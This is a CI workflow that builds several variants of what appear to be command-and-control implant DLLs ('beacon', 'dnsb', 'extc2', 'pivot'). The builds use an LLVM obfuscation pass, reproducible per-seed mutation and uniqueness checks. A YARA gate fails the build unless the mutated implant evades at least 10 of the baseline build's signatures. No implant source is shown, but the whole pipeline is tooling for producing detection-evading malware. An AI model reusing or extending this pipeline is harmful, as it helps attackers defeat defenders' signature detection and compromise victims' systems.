name: llvm-build

# LLVM 工具链侧车（docs/LLVM-MIGRATION.md Phase 0/1）：
#   linux-x64   — 主轨：Linux 交叉编译全部变体（clang-cl --target windows-msvc
#                 + xwin SDK/CRT + lld-link）
#   windows-x64 — 对照轨：同一钉版 LLVM 在 Windows 主机构建 beacon 子集 +
#                 MSVC 基线 load_smoke（Phase 1 门）+ 导出表对照
#   byte-diff   — 双轨产物 /Brepro sha256 对照（实验性，暂不阻断：跨主机
#                 字节一致是目标态，首轮数据先归因）
on:
  push:
    branches: [llvm]
  workflow_dispatch:

env:
  LLVM_VERSION: 19.1.7
  XWIN_VERSION: 0.10.0

jobs:
  linux-x64:
    name: linux cross (all variants)
    runs-on: ubuntu-22.04
    steps:
      - uses: actions/checkout@v4

      - name: Cache cross toolchain
        uses: actions/cache@v4
        with:
          path: ~/.llvm-cross
          key: llvm-cross-${{ env.LLVM_VERSION }}-xwin-${{ env.XWIN_VERSION }}-linux-v1

      - name: Setup LLVM + xwin
        shell: bash
        run: bash tools/llvm/setup-host.sh

      - name: Build mutation pass plugin (CMake + AddLLVM, pinned LLVM)
        shell: bash
        run: |
          set -e
          source "$HOME/.llvm-cross/toolpath.env"
          LLVM_DIR="$HOME/.llvm-cross/llvm/lib/cmake/llvm"
          cmake -S tools/llvm/pass -B tools/llvm/pass/build \
            -DLLVM_DIR="$LLVM_DIR" -DCMAKE_BUILD_TYPE=Release
          cmake --build tools/llvm/pass/build -j 2
          ls -la tools/llvm/pass/build/obfpasses.so

      - name: CMake pass plugin env (mutation)
        shell: bash
        run: |
          echo "OBF_SO=$PWD/tools/llvm/pass/build/obfpasses.so" >> "$GITHUB_ENV"

      - name: CMake baseline beacon (YARA reference)
        shell: bash
        run: |
          set -e
          source "$HOME/.llvm-cross/toolpath.env"
          cmake -S tools/llvm -B build/base \
            -DREPO="$PWD" -DXWIN_DIR="$XWIN_SPLAT" \
            -DCLANG_CL="$LLVM_CLANG" -DLLD_LINK="$LLVM_LLD" \
            -DVARIANTS="beacon-x64-wininet-layout"
          cmake --build build/base --target beacon-x64-wininet-layout
          cmake --build build/base --target beacon-x64-wininet-layout
          rm -rf build/base   # convergence rebuild: gen/layout.h is now the
                              # real table; a fresh dir rebuilds converged
          cmake -S tools/llvm -B build/base \
            -DREPO="$PWD" -DXWIN_DIR="$XWIN_SPLAT" \
            -DCLANG_CL="$LLVM_CLANG" -DLLD_LINK="$LLVM_LLD" \
            -DVARIANTS="beacon-x64-wininet-layout"
          cmake --build build/base --target beacon-x64-wininet-layout
          mkdir -p llvm-out
          cp build/base/out/beacon-x64-wininet-layout/out/beacon.x64.llvm.dll llvm-out/beacon.x64.llvm.dll
          cp build/base/out/beacon-x64-wininet-layout/out/beacon.x64.llvm.map llvm-out/beacon.x64.llvm.map
          BASE_SHA=$(sha256sum llvm-out/beacon.x64.llvm.dll | cut -d' ' -f1)
          echo "BASE_SHA=$BASE_SHA" >> "$GITHUB_ENV"
          echo "baseline: $BASE_SHA"

      - name: CMake obf variants (product matrix, mutated)
        shell: bash
        run: |
          set -e
          source "$HOME/.llvm-cross/toolpath.env"
          export OBF_SEED=1337
          echo 1337 > tools/llvm/pass/seed.txt
          VARIANTS="beacon-x64-wininet-layout;beacon-x64-winhttp-layout;dnsb-x64-wininet-layout;extc2-x64-wininet-layout;pivot-x64-wininet-layout;beacon-x64-wininet-plainsleep+layout;beacon-x64-wininet-noexcreg;beacon-x64-wininet-diagretaddr;beacon-x64-wininet-bofwin"
          cmake -S tools/llvm -B build/obf \
            -DREPO="$PWD" -DXWIN_DIR="$XWIN_SPLAT" \
            -DCLANG_CL="$LLVM_CLANG" -DLLD_LINK="$LLVM_LLD" \
            -DOBF_SO="$OBF_SO" -DOBF_SEED=1337 -DVARIANTS="$VARIANTS"
          cmake --build build/obf --target all-variants
          rm -rf build/obf   # convergence rebuild (fresh dir, converged table)
          cmake -S tools/llvm -B build/obf \
            -DREPO="$PWD" -DXWIN_DIR="$XWIN_SPLAT" \
            -DCLANG_CL="$LLVM_CLANG" -DLLD_LINK="$LLVM_LLD" \
            -DOBF_SO="$OBF_SO" -DOBF_SEED=1337 -DVARIANTS="$VARIANTS"
          cmake --build build/obf --target all-variants
          mkdir -p llvm-out
          for f in build/obf/out/*/out/*.llvm.dll; do
            tn=$(basename "$(dirname "$(dirname "$f")")")
            case "$tn" in
              beacon-x64-wininet-layout) cp "$f" llvm-out/beacon.obf.llvm.dll; cp "${f%.dll}.map" llvm-out/beacon.obf.llvm.map;;
              beacon-x64-winhttp-layout) cp "$f" llvm-out/winhttpb.obf.llvm.dll;;
              dnsb-x64-wininet-layout) cp "$f" llvm-out/dnsb.obf.llvm.dll;;
              extc2-x64-wininet-layout) cp "$f" llvm-out/extc2.obf.llvm.dll;;
              pivot-x64-wininet-layout) cp "$f" llvm-out/pivot.obf.llvm.dll;;
              beacon-x64-wininet-plainsleep+layout) cp "$f" llvm-out/beacon.plainsleep.llvm.dll; cp "${f%.dll}.map" llvm-out/beacon.plainsleep.llvm.map;;
              beacon-x64-wininet-noexcreg) cp "$f" llvm-out/beacon.noexcreg.llvm.dll;;
              beacon-x64-wininet-diagretaddr) cp "$f" llvm-out/beacon.rngdiag.llvm.dll;;
              beacon-x64-wininet-bofwin) cp "$f" llvm-out/beacon.x64.rl0k.llvm.dll;;
            esac
          done
          A_SHA=$(sha256sum llvm-out/beacon.obf.llvm.dll | cut -d' ' -f1)
          echo "A_SHA=$A_SHA" >> "$GITHUB_ENV"
          echo "obf beacon: $A_SHA"

      - name: CMake determinism (same seed rebuild)
        shell: bash
        run: |
          set -e
          source "$HOME/.llvm-cross/toolpath.env"
          export OBF_SEED=1337
          echo 1337 > tools/llvm/pass/seed.txt
          rm -rf build/obf
          VARIANTS="beacon-x64-wininet-layout"
          cmake -S tools/llvm -B build/obf \
            -DREPO="$PWD" -DXWIN_DIR="$XWIN_SPLAT" \
            -DCLANG_CL="$LLVM_CLANG" -DLLD_LINK="$LLVM_LLD" \
            -DOBF_SO="$OBF_SO" -DOBF_SEED=1337 -DVARIANTS="$VARIANTS"
          cmake --build build/obf --target beacon-x64-wininet-layout
          rm -rf build/obf   # convergence rebuild
          cmake -S tools/llvm -B build/obf \
            -DREPO="$PWD" -DXWIN_DIR="$XWIN_SPLAT" \
            -DCLANG_CL="$LLVM_CLANG" -DLLD_LINK="$LLVM_LLD" \
            -DOBF_SO="$OBF_SO" -DOBF_SEED=1337 -DVARIANTS="$VARIANTS"
          cmake --build build/obf --target beacon-x64-wininet-layout
          B_SHA=$(sha256sum build/obf/out/beacon-x64-wininet-layout/out/beacon.x64.llvm.dll | cut -d' ' -f1)
          if [ "$A_SHA" != "$B_SHA" ]; then
            echo "DETERMINISM FAIL A vs B: $A_SHA vs $B_SHA"
            cmp -l /tmp/obf_a.dll build/obf/out/beacon-x64-wininet-layout/out/beacon.x64.llvm.dll 2>/dev/null | head -12 || true
            # discriminator: rebuild C from B's converged gen/layout.h state
            cmake --build build/obf --target beacon-x64-wininet-layout || true
            rm -f gen/layout.h
            cmake --build build/obf --target beacon-x64-wininet-layout || true
            C_SHA=$(sha256sum build/obf/out/beacon-x64-wininet-layout/out/beacon.x64.llvm.dll | cut -d' ' -f1)
            echo "C_SHA=$C_SHA (B=$B_SHA)"
            if [ "$B_SHA" = "$C_SHA" ]; then
              echo "VERDICT: chain-converged difference (A built from a stale gen/layout.h; B/C stable) - fix = converge before the gate"
            else
              echo "VERDICT: true pass nondeterminism"
            fi
            exit 1
          fi
          echo "determinism OK"

      - name: CMake uniqueness (different seed)
        shell: bash
        run: |
          set -e
          source "$HOME/.llvm-cross/toolpath.env"
          rm -rf build/obf
          echo 424242 > tools/llvm/pass/seed.txt
          cmake -S tools/llvm -B build/obf \
            -DREPO="$PWD" -DXWIN_DIR="$XWIN_SPLAT" \
            -DCLANG_CL="$LLVM_CLANG" -DLLD_LINK="$LLVM_LLD" \
            -DOBF_SO="$OBF_SO" -DOBF_SEED=424242 -DVARIANTS="beacon-x64-wininet-layout"
          cmake --build build/obf --target beacon-x64-wininet-layout
          rm -rf build/obf   # uniqueness rebuild: fresh dir + new seed
                             # (the A-build objects must never be reused,
                             # otherwise the new seed compiles nothing)
          cmake -S tools/llvm -B build/obf \
            -DREPO="$PWD" -DXWIN_DIR="$XWIN_SPLAT" \
            -DCLANG_CL="$LLVM_CLANG" -DLLD_LINK="$LLVM_LLD" \
            -DOBF_SO="$OBF_SO" -DOBF_SEED=424242 -DVARIANTS="beacon-x64-wininet-layout"
          cmake --build build/obf --target beacon-x64-wininet-layout
          C_SHA=$(sha256sum build/obf/out/beacon-x64-wininet-layout/out/beacon.x64.llvm.dll | cut -d' ' -f1)
          if [ "$A_SHA" = "$C_SHA" ]; then
            echo "UNIQUENESS FAIL: different seed gave identical output"
            exit 1
          fi
          echo "uniqueness OK: $A_SHA vs $C_SHA"
          if [ "$BASE_SHA" = "$A_SHA" ]; then
            echo "BASELINE COLLISION"; exit 1
          fi
          echo "obf differs from baseline OK"

      - name: YARA self-check (site-centered, statistical)
        shell: bash
        run: |
          set -e
          sudo apt-get install -y yara >/dev/null 2>&1
          python3 tools/llvm/gen_yara.py llvm-out/beacon.x64.llvm.dll llvm-out/beacon.x64.llvm.map llvm-out/bw_baseline.yar
          BM=$(yara -w llvm-out/bw_baseline.yar llvm-out/beacon.x64.llvm.dll | grep -c bw_sig || true)
          echo "yara baseline matches: $BM"
          [ "$BM" -ge 12 ] || { echo "YARA FAIL: baseline does not match its own signatures"; exit 1; }
          MM=$(yara -w llvm-out/bw_baseline.yar llvm-out/beacon.obf.llvm.dll | grep -c bw_sig || true)
          echo "yara mutated matches: $MM (of $BM)"
          LOST=$((BM - MM))
          [ "$LOST" -ge 10 ] || { echo "YARA FAIL: mutation lost only $LOST of $BM signatures"; exit 1; }
          echo "yara coverage OK: lost $LOST of $BM"

      - name: Size report
        if: always()
        shell: bash
        run: |
          {
            echo '### llvm linux-x64 build sizes (CMake driver)'
            for f in llvm-out/*.dll build/*/out/*/out/*.llvm.dll; do
              [ -f "$f" ] && echo "$(basename $f): $(stat -c%s $f)"
            done
            echo
            echo '(MSVC 基线对照见主 build.yml 的 step summary)'
          } >> "$GITHUB_STEP_SUMMARY" 2>/dev/null || true

      - name: Upload artifacts
        uses: actions/upload-artifact@v4
        if: always()   # failing YARA/determinism gates must still ship the pair for offline forensics
        with:
          name: llvm-linux-x64
          path: |
            llvm-out/*.dll
            llvm-out/*.map
            llvm-out/beacon.obf.sha256
            llvm-out/beacon.obfnobogo.llvm.dll
            llvm-out/_sizes.json

  windows-x64:
    name: windows host (sidecar + phase-1 gate)
    runs-on: windows-2022
    defaults:
      run:
        shell: bash
    steps:
      - uses: actions/checkout@v4

      - name: Cache xwin splat
        uses: actions/cache@v4
        with:
          path: C:\Users\runneradmin\.llvm-cross
          key: llvm-cross-${{ env.LLVM_VERSION }}-xwin-${{ env.XWIN_VERSION }}-win-v1

      - name: Setup LLVM + xwin
        run: bash tools/llvm/setup-host.sh

      - name: Build llvm sidecar (beacon subset)
        run: |
          set -e
          source "$HOME/.llvm-cross/toolpath.env"
          PY=python; [[ -n "$(command -v python3)" ]] && PY=python3
          B=($PY tools/llvm/build.py --clang-cl "$LLVM_CLANG" --lld-link "$LLVM_LLD" --xwin-dir "$XWIN_SPLAT")
          "${B[@]}" --project beacon --platform x64
          "${B[@]}" --project beacon --platform x64 --http winhttp
          "${B[@]}" --project beacon --platform x64 --bofwin

      - name: Setup MSVC (baseline + smoke harness)
        uses: ilammy/msvc-dev-cmd@v1
        with:
          arch: x64

      - name: Build MSVC baseline beacon
        shell: pwsh
        run: ./build.ps1 -Project beacon -Toolset v143

      - name: Compile load_smoke harness
        shell: pwsh
        run: |
          New-Item -ItemType Directory -Force -Path tests\_build | Out-Null
          & cl /nologo /W3 /EHsc /MT tests\load_smoke.cpp /Fe:tests\_build\load_smoke.exe /Fo:tests\_build\
          if ($LASTEXITCODE -ne 0) { throw "load_smoke build failed" }

      - name: load_smoke — MSVC baseline (sanity)
        run: ./tests/_build/load_smoke.exe x64/Release/beacon.x64.dll

      - name: load_smoke — LLVM build (Phase 1 gate)
        run: |
          ./tests/_build/load_smoke.exe llvm-out/beacon.x64.llvm.dll
          ./tests/_build/load_smoke.exe llvm-out/winhttpb.x64.llvm.dll
          ./tests/_build/load_smoke.exe llvm-out/beacon.x64.rl0k.llvm.dll

      - name: Export table diff (MSVC vs LLVM)
        run: |
          source "$HOME/.llvm-cross/toolpath.env"
          python tools/llvm/compare_exports.py "$LLVM_READOBJ" x64/Release/beacon.x64.dll llvm-out/beacon.x64.llvm.dll

      - name: Size report
        shell: pwsh
        run: |
          $rows = (Get-ChildItem llvm-out/*.llvm.dll | ForEach-Object { "| $($_.Name) | $($_.Length) |" }) -join "`n"
          $msvc = Get-Item x64/Release/beacon.x64.dll
          "### llvm windows-x64 sidecar`n`n| dll | bytes |`n|---|---|`n$rows`n| MSVC baseline beacon.x64.dll | $($msvc.Length) |`n" >> $env:GITHUB_STEP_SUMMARY

      - name: Upload artifacts
        uses: actions/upload-artifact@v4
        with:
          name: llvm-windows-x64
          path: |
            llvm-out/*.dll
            llvm-out/*.map

  byte-diff:
    name: dual-host /Brepro diff (experimental)
    needs: [linux-x64, windows-x64]
    runs-on: ubuntu-22.04
    continue-on-error: true
    steps:
      - uses: actions/checkout@v4
      - uses: actions/download-artifact@v4
        with: { name: llvm-linux-x64, path: lin }
      - uses: actions/download-artifact@v4
        with: { name: llvm-windows-x64, path: win }

      - name: sha256 compare
        shell: bash
        run: |
          python3 - <<'EOF' >> "$GITHUB_STEP_SUMMARY"
          import hashlib, os
          def sums(d):
              out = {}
              for f in sorted(os.listdir(d)):
                  if f.endswith(".dll"):
                      out[f] = hashlib.sha256(open(os.path.join(d, f), "rb").read()).hexdigest()
              return out
          lin, win = sums("lin"), sums("win")
          print("### dual-host byte-diff (/Brepro)\n")
          print("| dll | linux sha256 | windows sha256 | identical |")
          print("|---|---|---|---|")
          mismatch = []
          for f in sorted(set(lin) | set(win)):
              a, b = lin.get(f, "-"), win.get(f, "-")
              same = "YES" if a == b else ("n/a (single-host)" if f not in lin or f not in win else "no")
              if f in lin and f in win and a != b:
                  mismatch.append(f)
              print(f"| {f} | {a[:16]} | {b[:16]} | {same} |")
          # windows sidecar builds the beacon subset only: win must be a subset
          if not set(win) <= set(lin):
              print(f"\nvariant set mismatch: win-only={set(win)-set(lin)}")
              raise SystemExit(1)
          common = [f for f in win if f in lin]
          print(f"\nbyte-identical: {len(common)-len(mismatch)}/{len(common)} common")
          EOF
